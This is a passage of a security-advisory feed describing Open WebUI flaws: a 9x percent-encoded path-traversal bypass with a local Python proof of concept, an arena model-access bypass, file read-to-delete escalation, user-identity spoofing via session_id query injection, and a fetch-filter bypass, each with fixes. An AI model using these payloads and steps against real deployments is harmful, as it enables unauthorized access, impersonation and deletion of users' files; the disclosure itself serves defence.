<p>The fix for GHSA-r2wg-2mcr-66rv is incomplete in v0.9.6 and current main. <code>backend/open_webui/routers/terminals.py</code> documents <code>_sanitize_proxy_path()</code> as decoding until stable, but the implementation stops after 8 <code>unquote()</code> passes. A 9x percent-encoded <code>../...</code> path parameter remains once-encoded after the loop, passes the <code>posixpath.normpath()</code> and <code>cleaned.startswith('..')</code> checks, and is forwarded to the configured terminal server. The upstream server then receives a decoded traversal path such as <code>/base/../admin/system</code>.</p>
<h2 id="impact">Impact</h2>
<p>A user who has access to an admin-configured terminal connection can bypass the terminal proxy path traversal guard and cause Open WebUI to forward requests with the configured terminal credentials and <code>X-User-Id</code> header to paths outside the intended normalized proxy path. For orchestrator-backed terminal connections the same sanitized path is placed under <code>/p/{policy_id}/{safe_path}</code>, so the bypass can also target sibling or parent routes after upstream decoding. This is a bypass of the same terminal proxy boundary covered by GHSA-r2wg-2mcr-66rv.</p>
<p>This does not require adding a malicious terminal server or convincing an administrator to weaken settings. The attacker only needs normal access to an existing configured terminal connection.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The following standalone Python script mirrors the current sanitizer and uses a local aiohttp server as the terminal-server canary. It shows that 8x encoding is rejected but 9x encoding is accepted and forwarded as a traversal after the upstream framework decodes the path.</p>
<pre><code class="language-python">import asyncio, posixpath
from urllib.parse import unquote
from aiohttp import web, ClientSession, ClientTimeout

def sanitize(path):
    decoded = path
    for _ in range(8):
        once = unquote(decoded)
        if once == decoded:
            break
        decoded = once
    cleaned = posixpath.normpath(decoded).lstrip('/')
    if cleaned.startswith('..') or cleaned == '.':
        return None
    return cleaned

def enc(s, rounds):
    out = ''.join(f'%{b:02X}' for b in s.encode())
    for _ in range(rounds - 1):
        out = out.replace('%', '%25')
    return out

async def main():
    async def handler(request):
        return web.json_response({'raw_path': request.raw_path, 'path': request.path})
    app = web.Application()
    app.router.add_route('*', '/{tail:.*}', handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '127.0.0.1', 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]

    for rounds in (8, 9):
        safe = sanitize(enc('../admin/system', rounds))
        print(rounds, safe)
        if safe:
            url = f'http://127.0.0.1:{port}/base/{safe}'
            async with ClientSession(timeout=ClientTimeout(total=10)) as session:
                async with session.get(url) as response:
                    print(await response.json())
    await runner.cleanup()

asyncio.run(main())
</code></pre>
<p>Observed output on current main and v0.9.6 sanitizer:</p>
<pre><code class="language-text">8 None
9 %2E%2E%2F%61%64%6D%69%6E%2F%73%79%73%74%65%6D
{'raw_path': '/base/..%2Fadmin%2Fsystem', 'path': '/base/../admin/system'}
</code></pre>
<p>The 9x encoded path argument is 285 bytes long, so this is not a megabyte-sized or impractical URL. When sent through the real route, account for the ASGI server decoding the HTTP path once before filling the <code>{path:path}</code> parameter: an external request can use one additional encoding layer so <code>_sanitize_proxy_path()</code> receives the 9x encoded parameter shown above.</p>
<h2 id="root-cause--technical-details">Root Cause / Technical Details</h2>
<p><code>_sanitize_proxy_path()</code> in <code>backend/open_webui/routers/terminals.py</code> performs this loop:</p>
<pre><code class="language-python">decoded = path
for _ in range(8):
    once = unquote(decoded)
    if once == decoded:
        break
    decoded = once
</code></pre>
<p>The subsequent traversal check is applied only to the value after those 8 iterations. If the input still contains encoded dot and slash bytes after the loop, <code>posixpath.normpath()</code> treats them as ordinary characters rather than path separators. The code then builds <code>target_url = f'{base_url}/{safe_path}'</code> and sends it with <code>aiohttp.ClientSession.request()</code>. The upstream server receives and decodes the forwarded path, turning the accepted <code>%2E%2E%2F...</code> into <code>../...</code>.</p>
<p>The same vulnerable sanitizer is present in v0.9.6, the latest release. I verified the v0.9.6 <code>backend/open_webui/routers/terminals.py</code> hash matches current main for this file.</p>
<h2 id="remediation">Remediation</h2>
<p>Do not rely on a fixed decode-depth cap for a traversal security boundary. Recommended fixes:</p>
<ol>
<li>Decode until stable with a strict input length cap, and reject if the final value still contains encoded dot, slash, or backslash separators.</li>
<li>Reconstruct the allowed relative path from fully decoded segments: split on path separators, reject empty/current/parent segments, then join allowed segments with <code>/</code>.</li>
<li>Add regression tests for at least 9x and 10x encoded <code>../</code> payloads, including a route-level test that accounts for the ASGI server's initial path decode before the <code>{path:path}</code> parameter reaches <code>_sanitize_proxy_path()</code>.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w">https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59221">https://nvd.nist.gov/vuln/detail/CVE-2026-59221</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26050">https://github.com/open-webui/open-webui/pull/26050</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/05098d25a58d03738e01c4e85e8852c3b4ad849c">https://github.com/open-webui/open-webui/commit/05098d25a58d03738e01c4e85e8852c3b4ad849c</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-frvj-c5qp-xj4w">https://github.com/advisories/GHSA-frvj-c5qp-xj4w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frvj-c5qp-xj4w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:05:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Arena task endpoints can bypass underlying model access controls]]></title>
        <id>https://github.com/advisories/GHSA-m3qf-58wf-w979</id>
        <link href="https://github.com/advisories/GHSA-m3qf-58wf-w979"/>
        <updated>2026-07-24T20:54:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An authenticated non-admin user with read access to an arena wrapper model can reach a restricted underlying model through task endpoints such as <code>/api/v1/tasks/moa/completions</code>.</p>
<p>The normal chat route resolves arena models before the final chat dispatch and therefore re-checks the selected underlying model. The task routes call <code>utils.chat.generate_chat_completion()</code> directly. In that direct path, arena fallback resolution happens after the wrapper access check and then recurses with <code>bypass_filter=True</code>, skipping the selected submodel's access check.</p>
<h2 id="technical-details">Technical Details</h2>
<p>Open WebUI's current model-access behavior already denies direct access to the restricted model. The normal chat path also denies the selected restricted model after arena preprocessing. The task endpoint path is inconsistent with that protected behavior because it reaches the same restricted model only through the direct arena fallback and recursive <code>bypass_filter=True</code>.</p>
<p>This report does not rely on malicious provider configuration, user-authored Tools/Functions, or direct code execution. The crossed boundary is model read authorization.</p>
<p>Although the arena wrapper must be readable by the user, this is not just an "admin exposed a restricted model" configuration claim. The same configured arena is denied by the normal chat post-preprocessor control once the selected restricted model is the dispatch target. The bypass is specific to task endpoints that skip that preprocessor and enter the fallback arena resolver.</p>
<p>Official documentation also points to this interpretation:</p>
<ul>
<li>Open WebUI documents model access control as restricting models to specific users or groups.</li>
<li>The workspace-model documentation treats "wrapper checked, restricted underlying model reached" as broken access control and recommends independent entries for curated deployments.</li>
<li>The evaluation documentation describes arena mode as an evaluation/comparison feature that randomly selects models to compare, not as a feature that grants access to otherwise restricted models.</li>
<li>This is not an unsafe-admin-action report: the same intended model access restriction is enforced on the direct model path and on the normal-chat selected-model control, then bypassed only through the task endpoint call order.</li>
</ul>
<h2 id="pov">PoV</h2>
<p>The attached local PoV does not start a server and does not contact any model provider. It imports the current Open WebUI task endpoint and replaces provider dispatch plus model-access checks with local stubs so the call graph can be observed safely.</p>
<p>Observed result:</p>
<table>
<thead>
<tr>
<th>Case</th>
<th>Expected</th>
<th>Actual</th>
</tr>
</thead>
<tbody><tr>
<td>Direct task request with <code>model=restricted-model</code></td>
<td>Denied before provider dispatch</td>
<td>Denied; no provider call recorded</td>
</tr>
<tr>
<td>Normal-chat post-preprocessor control with <code>model=restricted-model</code> and <code>metadata.selected_model_id=restricted-model</code></td>
<td>Denied before provider dispatch</td>
<td>Denied; no provider call recorded</td>
</tr>
<tr>
<td>Task request with <code>model=public-arena</code> that selects <code>restricted-model</code></td>
<td>Denied when selected model is restricted</td>
<td>Local provider stub reached with <code>model=restricted-model</code> and <code>bypass_filter=true</code></td>
</tr>
</tbody></table>
<p>In the arena task case, the restricted model is absent from the access-check log.</p>
<h2 id="impact">Impact</h2>
<p>A regular user can use a readable arena wrapper as an oracle for a restricted model via task-generation endpoints. For <code>/api/v1/tasks/moa/completions</code>, the caller controls the task prompt and receives the generated response.</p>
<p>The crossed security boundary is model read authorization: a non-admin user who is denied direct access to a model can still cause Open WebUI to dispatch a request to that model with the operator-configured backend credentials.</p>
<p>This can allow:</p>
<ul>
<li>use of paid or internal models with the admin-configured provider key;</li>
<li>bypass of model access grants shown in the model selector;</li>
<li>cost and usage impact on pay-per-token providers;</li>
<li>exposure of model behavior or internal deployment capabilities that admins intended to restrict.</li>
</ul>
<p>Suggested CVSS v3.1: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L</code> = 7.6.</p>
<p>Primary CWE: CWE-862, Missing Authorization.</p>
<p>Authentication is required, so <code>PR:L</code> is used. User interaction is not required. The confidentiality impact is High because the attacker can query a model the administrator intended to restrict. Integrity and availability are Low because the request can consume provider quota and produce model output under an authorization decision the system would otherwise deny.</p>
<p>This should not be Critical: exploitation requires an authenticated user and a readable arena wrapper, does not cross into another security authority, and does not provide arbitrary code execution or full instance compromise.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Do not use <code>bypass_filter=True</code> for arena fallback dispatch unless the selected underlying model has already been authorized for the caller.</p>
<p>Recommended changes:</p>
<ul>
<li>after selecting <code>selected_model_id</code>, load the selected model and call <code>check_model_access(user, selected_model)</code> before recursive dispatch;</li>
<li>for <code>filter_mode=exclude</code> or empty <code>model_ids</code>, build the candidate pool from models the current user can read, not every non-arena model in <code>request.app.state.MODELS</code>;</li>
<li>add regression tests for <code>/api/v1/tasks/moa/completions</code>, <code>/api/v1/tasks/title/completions</code>, <code>/api/v1/tasks/tags/completions</code>, and normal <code>/api/chat/completions</code> arena behavior.</li>
</ul>
<h2 id="appendix-affected-components">Appendix: Affected Components</h2>
<ul>
<li><code>backend/open_webui/routers/tasks.py</code></li>
<li><code>/api/v1/tasks/moa/completions</code> builds a payload from caller-controlled <code>model</code>, <code>prompt</code>, and <code>responses</code>, then calls <code>generate_chat_completion(request, form_data=payload, user=user)</code>.</li>
<li><code>backend/open_webui/utils/chat.py</code></li>
<li>checks access for the user-supplied arena wrapper model.</li>
<li>fallback arena resolution selects an underlying model when the caller did not pass through <code>process_chat_payload()</code>.</li>
<li>recursive dispatch uses <code>bypass_filter=True</code>.</li>
<li><code>backend/open_webui/utils/models.py</code></li>
<li>arena wrapper access checks only wrapper <code>access_grants</code>.</li>
</ul>
<p>Current-head references:</p>
<ul>
<li><code>backend/open_webui/routers/tasks.py:662-707</code></li>
<li><code>backend/open_webui/utils/chat.py:190-204</code></li>
<li><code>backend/open_webui/utils/chat.py:215-240</code></li>
<li><code>backend/open_webui/utils/chat.py:248-269</code></li>
<li><code>backend/open_webui/utils/middleware.py:2323-2347</code></li>
<li><code>backend/open_webui/utils/models.py:378-407</code></li>
</ul>
<h2 id="appendix-duplicate-analysis">Appendix: Duplicate Analysis</h2>
<p>This is distinct from <code>GHSA-9vvh-qmjx-p4q8</code> / <code>CVE-2026-44555</code>, which covers <code>base_model_id</code> chaining and user-created workspace models. Current head includes the base-model-chain access fix through <code>has_base_model_access</code>.</p>
<p>This report covers task endpoints that call <code>generate_chat_completion()</code> without the main chat preprocessor. The root cause is arena fallback plus recursive <code>bypass_filter=True</code>, not <code>base_model_id</code>.</p>
<p>Live duplicate sweep before submission also reviewed:</p>
<ul>
<li><code>GHSA-v6qf-75pr-p96m</code>: exposed HTTP query parameter <code>?bypass_filter=true</code>. This report does not rely on caller-controlled query parameters; the task endpoint reaches the server-side recursive <code>bypass_filter=True</code> path after arena fallback resolution.</li>
<li><code>GHSA-hp5m-24vp-vq2q</code>: <code>/api/openai/responses</code> passthrough missing model authorization. This report targets <code>/api/v1/tasks/moa/completions</code> and the arena resolver inside <code>utils.chat.generate_chat_completion()</code>.</li>
<li><code>GHSA-gfm2-xm6c-37qc</code>: chat ownership authorization in completions. This report does not require another user's chat ID.</li>
</ul>
<p>If maintainers prefer to treat this as the same broad "wrapper checked, underlying model not checked" class, it should still be a distinct exploitation vector and affected component: task endpoints, not model creation/import or <code>base_model_id</code> dispatch.</p>
<h2 id="appendix-preconditions">Appendix: Preconditions</h2>
<ul>
<li>Authenticated non-admin user.</li>
<li>The user can read an arena wrapper model, for example a custom arena with a public read grant.</li>
<li>The arena model includes at least one restricted underlying model that the user cannot query directly.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-m3qf-58wf-w979">https://github.com/open-webui/open-webui/security/advisories/GHSA-m3qf-58wf-w979</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59225">https://nvd.nist.gov/vuln/detail/CVE-2026-59225</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26046">https://github.com/open-webui/open-webui/pull/26046</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/dc4924b66e655b315e3be4430a3e51b7d5c20acc">https://github.com/open-webui/open-webui/commit/dc4924b66e655b315e3be4430a3e51b7d5c20acc</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m3qf-58wf-w979">https://github.com/advisories/GHSA-m3qf-58wf-w979</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m3qf-58wf-w979</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T20:54:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Model meta.knowledge read-only file access can be upgraded to file write/delete]]></title>
        <id>https://github.com/advisories/GHSA-2xwm-4h2q-ggfx</id>
        <link href="https://github.com/advisories/GHSA-2xwm-4h2q-ggfx"/>
        <updated>2026-07-24T20:51:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Current <code>main</code> and <code>v0.9.6</code> still allow an authenticated user to turn read-only access to another user's file into write/delete access by attaching that file ID to an attacker-controlled workspace model.</p>
<p>This is an incomplete-fix variant of <code>GHSA-vjqm-6gcc-62cr</code>. The current fix adds <code>_verify_knowledge_file_access()</code>, but the validator only checks <code>has_access_to_file(file_id, "read", user)</code>. The file write/delete routes later trust <code>has_access_to_file(file_id, "write", user)</code>, and that function grants access through any writable model whose <code>meta.knowledge</code> contains the file ID.</p>
<p>The PoV includes a negative control showing the current validator rejects an inaccessible arbitrary file ID. The residual issue is narrower: a file ID that is readable only through a KB read grant is accepted into direct model file metadata, then the same model metadata satisfies later file write/delete checks.</p>
<h2 id="technical-details">Technical Details</h2>
<p><code>backend/open_webui/routers/models.py::_verify_knowledge_file_access()</code> accepts model <code>meta.knowledge</code> file entries when the caller can read the file:</p>
<pre><code class="language-python">if not await has_access_to_file(file_id, 'read', user, db=db):
    raise HTTPException(...)
</code></pre>
<p><code>backend/open_webui/utils/access_control/files.py::has_access_to_file()</code> then uses attacker-writable model metadata as a source for any requested access type:</p>
<pre><code class="language-python">for model in await Models.get_models_by_user_id(user.id, permission=access_type, db=db):
    knowledge_items = getattr(model.meta, 'knowledge', None) or []
    for item in knowledge_items:
        if isinstance(item, dict) and item.get('type') == 'file' and item.get('id') == file.id:
            return True
</code></pre>
<p>For <code>access_type="write"</code>, the attacker-owned model satisfies the model query, so the victim file becomes writable even though the attacker only had read access through the KB grant.</p>
<p>This crosses another user's integrity and availability boundary, not just the attacker's own account. Before model metadata is involved, the attacker can read the file through a KB grant but cannot write it. After the model metadata entry is accepted, the same file becomes writable/deletable.</p>
<p>The official docs distinguish attached knowledge permissions: knowledge-base collections may use explicit read grants, while individual files are owner/admin-only. This issue lets a read grant to a KB become direct write/delete authority over an individual file.</p>
<p>This is also consistent with the documented RBAC model: resource grants have separate <code>read</code> and <code>write</code> permissions, where write means the user can update or delete the resource. The exploit starts from a read-only KB grant and reaches file write/delete without a corresponding file owner/admin/write authorization.</p>
<p>The required Models workspace access is not root-equivalent in Open WebUI's documentation. The policy's root-equivalent warning applies to Tools/Functions code execution. This report does not use Tools/Functions, custom Python, admin actions, or a legacy-only path.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated non-admin user with Models workspace access and read-only access to a victim file through a knowledge-base grant can create/import/update a model that references the file, then rename, overwrite, or delete the victim user's file through write-gated file routes.</p>
<p>Confirmed sinks in current head:</p>
<ul>
<li><code>POST /api/v1/files/{id}/rename</code></li>
<li><code>POST /api/v1/files/{id}/data/content/update</code></li>
<li><code>DELETE /api/v1/files/{id}</code></li>
</ul>
<p>Suggested severity: High.</p>
<p>Suggested CVSS:</p>
<pre><code class="language-text">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
</code></pre>
<p>Suggested CWE:</p>
<pre><code class="language-text">CWE-863: Incorrect Authorization
</code></pre>
<p>I am not claiming Critical severity because the attacker must be authenticated, must have Models workspace access, and must already have read-only access to the victim file through a KB grant. The High score is based on the post-condition: that limited read access becomes destructive cross-user file write/delete.</p>
<h2 id="appendix-ai-disclosure">Appendix: AI Disclosure</h2>
<h2 id="appendix-local-pov">Appendix: Local PoV</h2>
<p>The PoV is local-only. It does not start a server, send network traffic, or use a real database. It loads and executes the current-head function bodies for:</p>
<ul>
<li><code>has_access_to_file()</code></li>
<li><code>_verify_knowledge_file_access()</code></li>
<li><code>delete_file_by_id()</code></li>
</ul>
<p>Run from the harness root:</p>
<pre><code class="language-bash">uv run python attached-evidence/poc/pov_openwebui_model_file_read_to_write.py
</code></pre>
<p>Observed output:</p>
<pre><code class="language-json">{
  "confirmed": true,
  "control_inaccessible_file_rejected_by_validator": true,
  "control_read_allowed_via_kb_read_grant": true,
  "control_write_allowed_before_model_laundering": false,
  "model_metadata_validator_passed_with_read_only_access": true,
  "write_allowed_after_attacker_owned_model_contains_file": true,
  "delete_route_result": {
    "message": "File deleted successfully"
  },
  "deleted_file_ids": [
    "victim-file"
  ]
}
</code></pre>
<p>This demonstrates expected versus actual behavior:</p>
<ul>
<li>Expected: a user with only read access through a KB grant cannot mutate the victim file.</li>
<li>Actual: after the read-only file ID is accepted into attacker-owned model metadata, the same user satisfies the file write/delete guard and deletes the victim file.</li>
</ul>
<h2 id="appendix-remediation">Appendix: Remediation</h2>
<p>Recommended defense-in-depth fix:</p>
<ol>
<li>In <code>_verify_knowledge_file_access()</code>, require direct file ownership or admin for <code>type: "file"</code> model knowledge entries. Do not accept indirect KB read access as sufficient authority to attach an individual file to a model.</li>
<li>In <code>has_access_to_file()</code>, do not let the model <code>meta.knowledge</code> branch grant write access to files. Model-attached knowledge should be read-only unless the caller separately owns/administers the underlying file or has an explicit write-capable file authorization path.</li>
<li>Add regression tests covering the KB-read control, the blocked model attach, and rename/update/delete denial for the victim file.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-2xwm-4h2q-ggfx">https://github.com/open-webui/open-webui/security/advisories/GHSA-2xwm-4h2q-ggfx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59212">https://nvd.nist.gov/vuln/detail/CVE-2026-59212</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26032">https://github.com/open-webui/open-webui/pull/26032</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/17df0264929514599dbcb21c6578bcdfa204b04d">https://github.com/open-webui/open-webui/commit/17df0264929514599dbcb21c6578bcdfa204b04d</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2xwm-4h2q-ggfx">https://github.com/advisories/GHSA-2xwm-4h2q-ggfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xwm-4h2q-ggfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T20:51:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Terminal proxy forwards a spoofable, integrity-unbound user identity to the upstream (X-User-Id header and ws_terminal session_id query injection)]]></title>
        <id>https://github.com/advisories/GHSA-j657-m4c4-24jq</id>
        <link href="https://github.com/advisories/GHSA-j657-m4c4-24jq"/>
        <updated>2026-07-24T20:49:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The terminal proxy in <code>backend/open_webui/routers/terminals.py</code> forwards the Open WebUI user's identity to the upstream terminal server / backend coordinator as an authorization claim, with no cryptographic binding to the session that produced it. The forwarded identity is attacker-influenceable on both proxy paths:</p>
<ol>
<li><p><strong>HTTP path (<code>proxy_terminal</code>)</strong> sets <code>headers['X-User-Id'] = user.id</code>. Upstreams that trust <code>X-User-Id</code> as identity receive it unsigned, so an attacker who can reach the upstream by other means (directly, a compromised peer, SSRF) can spoof it.</p>
</li>
<li><p><strong>WebSocket path (<code>ws_terminal</code>)</strong> is exploitable through Open WebUI itself, with no "other means" required. It interpolates the path parameter <code>session_id</code> directly into the upstream URL and then appends <code>?user_id=&lt;caller&gt;</code>:</p>
<pre><code class="language-python">upstream_url = f'{ws_base}/p/{policy_id}/api/terminals/{session_id}'
upstream_url += f'?{urllib.parse.urlencode({"user_id": user.id})}'
</code></pre>
</li>
</ol>
<p><code>session_id</code> is neither validated nor URL-encoded (the HTTP sibling runs <code>_sanitize_proxy_path</code>; this path runs nothing). An encoded <code>?</code>/<code>&amp;</code> smuggled through <code>session_id</code> survives Open WebUI's single decode and is re-decoded by the upstream, injecting an attacker-chosen <code>user_id</code> ahead of the appended one. Query parsing binds the first occurrence, so the backend coordinator resolves the spoofed user's terminal scope.</p>
<h2 id="technical-details">Technical Details</h2>
<p>The forwarded terminal identity is a bearer-style authorization claim with no integrity binding, and on the WebSocket path it is additionally injectable because <code>session_id</code> is concatenated into the URL without encoding or delimiter validation.</p>
<h2 id="impact">Impact</h2>
<p>A normal authenticated user can make the terminal proxy present another user's identity to the upstream backend coordinator. On backend coordinator-backed (<code>policy_id</code>) servers that scope terminal containers by <code>user_id</code>, this reaches another user's terminal scope; combined with a known active session ID (for example a chat-scoped session ID surfaced through a shared chat), it allows attaching to that user's live PTY. The HTTP-path variant additionally allows identity spoofing at the upstream tier for any deployment whose upstream trusts <code>X-User-Id</code>.</p>
<h2 id="appendix-affected-code">Appendix: Affected code</h2>
<ul>
<li><code>backend/open_webui/routers/terminals.py</code> — <code>proxy_terminal</code> sets <code>headers['X-User-Id'] = user.id</code> with no signature.</li>
<li><code>backend/open_webui/routers/terminals.py</code> — <code>ws_terminal</code> builds the upstream URL from an unvalidated, unencoded <code>session_id</code> and appends <code>user_id</code> as a query parameter, allowing query injection.</li>
</ul>
<h2 id="appendix-consolidation">Appendix: Consolidation</h2>
<p>Per the Report Handling policy, this consolidates independent reports of the same root cause (the forwarded terminal identity is spoofable / not integrity-bound) into the earliest filing:</p>
<ul>
<li><strong>@smoke-wolf</strong> (earliest filing) — the <code>X-User-Id</code> HTTP-path identity is forwarded without integrity binding, spoofable where the upstream trusts the header.</li>
<li><strong>@rexpository</strong> — the <code>ws_terminal</code> <code>session_id</code> query-injection vector, proving the forwarded <code>user_id</code> is spoofable through the Open WebUI proxy itself, with no "reach the upstream by other means" precondition.</li>
</ul>
<h2 id="appendix-recommended-fix">Appendix: Recommended fix</h2>
<ul>
<li>Validate and URL-encode <code>session_id</code> before building the upstream URL (<code>urllib.parse.quote(session_id, safe="")</code>; reject <code>?</code>, <code>#</code>, <code>&amp;</code>, <code>/</code>, <code>%</code>, backslash, control characters). Build the query string with a URL builder so attacker-controlled path content cannot precede it.</li>
<li>Bind the forwarded identity instead of passing a raw <code>user_id</code> / <code>X-User-Id</code>: emit a short-lived signed claim (for example HS256 over <code>{uid, iat, aud:server_id}</code> with a key shared only with the specific upstream) and verify it upstream.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-j657-m4c4-24jq">https://github.com/open-webui/open-webui/security/advisories/GHSA-j657-m4c4-24jq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59224">https://nvd.nist.gov/vuln/detail/CVE-2026-59224</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26042">https://github.com/open-webui/open-webui/pull/26042</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/5f3a628a8d291bb5d33e1a0b0c89fb62a2927934">https://github.com/open-webui/open-webui/commit/5f3a628a8d291bb5d33e1a0b0c89fb62a2927934</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-j657-m4c4-24jq">https://github.com/advisories/GHSA-j657-m4c4-24jq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j657-m4c4-24jq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T20:49:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: `WEB_FETCH_FILTER_LIST` host allow/block filter bypassable via URL path and non-label-boundary matching]]></title>
        <id>https://github.com/advisories/GHSA-qg3f-8x3j-ggf2</id>
        <link href="https://github.com/advisories/GHSA-qg3f-8x3j-ggf2"/>
        <updated>2026-07-24T20:49:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The administrator-configured <code>WEB_FETCH_FILTER_LIST</code> (the allow/block list applied to server-side web fetches: RAG URL ingestion, URL-to-markdown, web-search content fetch) matches hostnames incorrectly, so the filter can be bypassed.</p>
<h2 id="details">Details</h2>
<p><code>is_string_allowed</code> (<code>backend/open_webui/utils/misc.py</code>) matches with <code>str.endswith(...)</code>, and the primary web-fetch call site (<code>backend/open_webui/retrieval/web/utils.py</code>) called it with the <strong>full URL string</strong>, not the hostname:</p>
<ul>
<li><strong>Blocklist bypass via path.</strong> A blocklist entry <code>!internal.example.com</code> only matches a URL that <em>ends with</em> that string. Any URL with a path (<code>https://internal.example.com/x</code>) ends with <code>/x</code>, so the entry never matches and the fetch proceeds. The blocklist effectively only stopped path-less URLs.</li>
<li><strong>Allowlist false-reject and bypass.</strong> An allowlist <code>company.com</code> rejected the legitimate <code>https://api.company.com/status</code> and admitted <code>https://attacker.example/path/company.com</code>.</li>
<li><strong>Non-label-boundary matching</strong> at the hostname-shaped call site (<code>retrieval/web/main.py</code>): <code>endswith('corp.com')</code> also matched <code>evilcorp.com</code>, and <code>10.0.0.1</code> matched <code>110.0.0.1</code>.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An authenticated user able to trigger a server-side web fetch can reach hosts the administrator intended to block with <code>WEB_FETCH_FILTER_LIST</code>.</p>
<p>Open WebUI's primary SSRF protection is a separate, always-on guard that rejects any URL resolving to a non-global IP (<code>validate_url</code> and the connection-layer <code>_ssrf_safe_new_conn</code>, active whenever <code>ENABLE_RAG_LOCAL_WEB_FETCH</code> is off, the default). That guard is unaffected by this issue and continues to block loopback, RFC1918 and link-local addresses, including the <code>169.254.169.254</code> cloud-metadata endpoint. This bypass therefore does <strong>not</strong> grant access to those internal targets. What it defeats is the administrator's ability to block specific <strong>publicly-resolvable</strong> hosts (internal services reachable from the server over a public IP, e.g. split-horizon DNS or internal PaaS endpoints) and to enforce an allowlist. Fetched content is returned to the requester, so for hosts reachable from the server's network position this is a read/content-disclosure SSRF against the admin-blocked host.</p>
<h2 id="patch">Patch</h2>
<p>Matching is now performed on the parsed hostname using DNS label boundaries. A dedicated <code>is_host_allowed(host, ...)</code> matches an entry only when host and entry are equal or the entry is a parent domain (<code>host == entry or host.endswith('.' + entry)</code>), so <code>corp.com</code> matches <code>api.corp.com</code> but not <code>evilcorp.com</code>, and IP entries match only the identical address. Both web-fetch call sites pass the parsed hostname rather than the full URL. The generic <code>is_string_allowed</code> is retained unchanged for unrelated non-host filters.</p>
<h2 id="credit">Credit</h2>
<p>Reported by @addcontent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-qg3f-8x3j-ggf2">https://github.com/open-webui/open-webui/security/advisories/GHSA-qg3f-8x3j-ggf2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59223">https://nvd.nist.gov/vuln/detail/CVE-2026-59223</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25949">https://github.com/open-webui/open-webui/pull/25949</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/087878ce848a4d828012068b5997dac480f43656">https://github.com/open-webui/open-webui/commit/087878ce848a4d828012068b5997dac480f43656</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-qg3f-8x3j-ggf2">https://github.com/advisories/GHSA-qg3f-8x3j-ggf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
